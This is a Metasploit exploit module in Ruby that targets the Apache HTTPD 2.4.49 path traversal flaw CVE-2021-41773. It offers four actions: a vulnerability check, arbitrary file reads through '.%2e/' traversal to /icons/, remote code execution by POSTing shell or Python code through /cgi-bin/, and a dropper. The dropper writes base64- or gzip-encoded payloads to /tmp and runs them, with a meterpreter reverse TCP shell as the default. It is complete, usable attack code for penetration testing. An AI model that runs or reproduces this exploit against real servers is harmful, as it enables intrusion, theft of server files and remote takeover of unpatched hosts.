## frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

###
#
# This module performs a RCE or a Local File Disclosure against
# Apache HTTPD server (using Path Traversal vulnerability).
# This vulnerability is named CVE-2021-41773 and impact Apache
# version 2.4.49.
#
###
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::EXE
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'CVE-2021-41773: Apache HTTPD Path Traversal' \
          ' (RCE - Remote Code Execution and Local File Disclosure)',
        'Description' => 'This module can be used to perform a RCE (Remote' \
          ' Code Execution) or a Local File Disclosure on Apache HTTPD ' \
          'server version 2.4.49.',
        'License' => MSF_LICENSE,
        'Author' => ['Maurice LAMBERT <mauricelambert434@gmail.com>'],
        'References' => [
          %w[CVE 2021-41773],
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2021-41773'],
          ['URL', 'https://github.com/mauricelambert/CVE-2021-41773']
        ],
        'Platform' => %w[unix linux],
        'Arch' => [ARCH_CMD, ARCH_X64, ARCH_X86],
        'DefaultOptions' => {
          'RPORT' => 80,
          'SSL' => false
        },
        'Targets' => [
          [
            'Automatic (Dropper)',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X64, ARCH_X86],
              'Type' => :linux_dropper,
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp',
                'DisablePayloadHandler' => 'false'
              }
            }
          ],
          [
            'Unix Command (In-Memory)',
            {
              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_command,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/generic',
                'DisablePayloadHandler' => 'true'
              }
            }
          ]
        ],
        'DisclosureDate' => '2021-09-29',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        },
        'Actions' => [
          [
            'CHECK',
            {
              'Description' => 'Check for Path Traversal vulnerability.'
            }
          ],
          [
            'EXECUTE_CODE',
            {
              'Description' =>
                'Exploit the RCE vulnerability with your own code.'

            }
          ],
          [
            'READ_FILE',
            {
              'Description' => 'Read file on the remote server.'
            }
          ],
          [
            'EXPLOIT',
            {
              'Description' =>
                'Exploit the RCE vulnerability with metasploit payload.'

            }
          ]
        ],
        'DefaultAction' => 'EXPLOIT'
      )
    )

    register_options(
      [
        OptString.new(
          'RPORT', [false, 'The target port (TCP)', 80],
        ),
        OptString.new(
          'SSL', [false, 'Negotiate SSL/TLS for outgoing connections', false],
        ),
        OptString.new(
          'TARGETURI', [false, 'The URI of the Apache HTTPD Web Server.', nil],
        ),
        OptString.new(
          'CODE', [false, 'The custom code to execute.', nil],
        ),
        OptString.new(
          'FILE', [false, 'A file to print.', nil],
        ),
        OptString.new(
          'LANG', [true, 'Language to use.', 'sh', %w[python python3 sh]],
        ),
        OptString.new(
          'ENCODE', [true, 'Encode type.', 'base64', %w[gzip base64]],
        ),
        OptString.new(
          'PAYLOAD_PATH', [
            true,
            'Path to store and execute the payload.',
            "/tmp/#{Rex::Text.rand_text_alpha(4..8)}"
          ]
        ),
        OptString.new(
          'ACTION', [
            true,
            'Action to exploit.',
            'EXPLOIT',
            %w[CHECK EXECUTE_CODE READ_FILE EXPLOIT]
          ],
        ),
      ]
    )

    @payloads = {
      'python' => {
        'base64' => (
          'from base64 import b64decode as d;from os import remove as r,' \
          'chmod as c,system as s;from os.path import join as j;open(' \
          '"<filename>","wb").write(d(b"<payload>"));c("<filename>",0o700)' \
          ';s(j(".","<filename>"));r("<filename>")'
        ),
        'gzip' =>
          'from io import BytesIO as b;from gzip import GzipFile as g;from' \
          ' os import remove as r,chmod as c,system as s;from os.path import' \
          ' join as j;open("<filename>","wb").write(g(mode="rb",fileobj=b(' \
          'b"<payload>")).read());c("<filename>",0o700);s(j(".",' \
          '"<filename>"));r("<filename>")'

      },
      'sh' => {
        'base64' => (
          'echo "<payload>" | base64 -d > "<filename>";chmod +x ' \
          '"<filename>";"<filename>";rm -f "<filename>"'
        ),
        'gzip' =>
          'echo -n -e "<payload>" | gzip -d > "<filename>";chmod +x' \
          ' "<filename>";"<filename>";rm -f "<filename>"'

      }
    }
  end

  ##
  # This function checks a Apache HTTPD for Path Traversal vulnerability
  def check
    path = ""
    Array(1..4).sample.times do
      path += "#{Rex::Text.rand_text_alphanumeric(Array(2..7).sample)}/"
    end

    response = read_file(path[0..-2])

    case response.code
    when 200
      print_good(
        'The targeted Apache HTTPD server is vulnerable and the ' \
        'vulnerability can be exploited.'
      )

      report_vuln(
        host: target_host,
        name: name,
        refs: references
      )

      Exploit::CheckCode::Vulnerable
    when 403, 404
      print_good('The Apache HTTPD server targeted is vulnerable.')

      report_vuln(
        host: target_host,
        name: name,
        refs: references
      )

      Exploit::CheckCode::Detected
    else
      print_error('The Apache HTTPD server targeted is not vulnerable.')
      Exploit::CheckCode::Safe
    end
  end

  ##
  # This function execute custom command on vulnerable Apache Web Server,
  # using the Path Traversal vulnerability
  #
  # code: should be a string of code to execute.
  def execute_code(code = nil, is_metasploit_payload = false)
    code ||= datastore['CODE']

    path = datastore['TARGETURI'] || '/cgi-bin/'
    path = path + (('/' if path[-1] != '/') or '')
    path += ('.%2e/' * 10)

    case datastore['LANG']
    when 'sh'
      path += 'usr/bin/bash'
      payload = "echo Content-Type: text/plain;echo;#{code}"
    when 'python'
      path += 'usr/bin/python'
      payload = "print('Content-Type: text/plain');print();#{code}"
    when 'python3'
      path += 'usr/bin/python3'
      payload = "print('Content-Type: text/plain');print();#{code}"
    when 'python2'
      path += 'usr/bin/python2'
      payload = "print('Content-Type: text/plain');print();#{code}"
    end

    vprint_good("Path: #{path}")
    vprint_good("Payload: #{payload}")
    register_file_for_cleanup datastore['PAYLOAD_PATH']

    response = send_request_raw({
                                  'uri' => path,
                                  'method' => 'POST',
                                  'data' => payload
                                })

    if response.nil? and not is_metasploit_payload
      print_error(
        'Host is unreachable - Could not connect to web service - no response'
      )

      fail_with(
       Failure::Unreachable,
       "#{peer} - Could not connect to web service - no response"
      )
    else
      response
    end
  end

  ##
  # This function execute custom command on vulnerable Apache Web Server,
  # using the Path Traversal vulnerability
  #
  # code: should be a string of code to execute.
  def action_execute_code(code = nil)
    response = execute_code(code)

    case response.code
    when 200
     print_good("Success, code output:\n#{response.body}")
     Exploit::CheckCode::Vulnerable
    else
     print_error("HTTP error: #{response.code}")
     Exploit::CheckCode::Safe
    end
  end

  ##
  # This function read a file on vulnerable Apache Web Server,
  # using the Path Traversal vulnerability.
  #
  # file: should be a string of file path.
  def read_file(file = nil)
    file ||= datastore['FILE']

    path = datastore['TARGETURI'] || '/icons/'
    path = path + (('/' if path[-1] != '/') or '')
    path += ('.%2e/' * 10)[0..-2] + file

    response = send_request_cgi(
      'uri' => path,
      'method' => 'GET'
    )

    if response.nil?
      print_error(
        'Host is unreachable - Could not connect to web service - no response'
      )

      fail_with(
        Failure::Unreachable,
        "#{peer} - Could not connect to web service - no response"
      )
    else
      response
    end
  end

  ##
  # This function build the full payload using metasploit payloads,
  # LANG configuration and ENCODE configuration.
  #
  # payload: a metasploit payload
  def buil_payload(payload)
    language = datastore['LANG']

    if language.start_with? "python"
      language = "python"
    end

    payload = @payloads[language][datastore['ENCODE']].dup
    payload.gsub!('"<filename>"', datastore['PAYLOAD_PATH'].dump)

    case datastore['ENCODE']
    when 'gzip'

      if datastore['LANG'] == 'sh'
        temp_payload = (
          "'#{Rex::Text.gzip(generate_payload_exe).gsub("'", "'\"'\"'")}'"
        )
        temp_payload = temp_payload.dump.gsub('\"', '"')
        payload['"<payload>"'] = temp_payload[1..-2]
      else
        payload['"<payload>"'] = Rex::Text.gzip(generate_payload_exe).dump
      end

    when 'base64'
      payload['"<payload>"'] = (
        Rex::Text.encode_base64(generate_payload_exe).dump
      )
    end

    payload
  end

  ##
  # This function read a file on vulnerable Apache Web Server,
  # using the Path Traversal vulnerability.
  #
  # file: should be a string of file path.
  def action_read_file(file = nil)
    response = read_file(file)

    case response.code
    when 200
      print_good("Success, file content:\n#{response.body}")
      Exploit::CheckCode::Vulnerable
    when 404
      print_error('File does not exists on the target.')
      Exploit::CheckCode::Detected
    when 403
      print_error('You do not have permission on this file.')
    else
      print_error("HTTP error: #{response.code}")
      Exploit::CheckCode::Safe
    end
  end

  ##
  # This module exploits a Path Traversal to perform a RCE
  # or a Local File Disclosure
  def exploit
    case datastore['ACTION']
    when 'CHECK'
      check
    when 'EXECUTE_CODE'
      if datastore['CODE'].nil?
        fail_with(
          Failure::BadConfig,
          'Action EXECUTE_CODE require CODE to execute remotely.'
        )
      end
      action_execute_code
    when 'READ_FILE'
      if datastore['FILE'].nil?
        fail_with(
          Failure::BadConfig,
          'Action READ_FILE require FILE to read remotely.'
        )
      end

      action_read_file
    when 'EXPLOIT'
      case target['Type']
      when :linux_dropper
        payload = buil_payload(generate_payload_exe)
      when :unix_command
        payload = buil_payload(payload.encoded.to_s)
      end
      execute_code(payload, true)
    end
  end
end
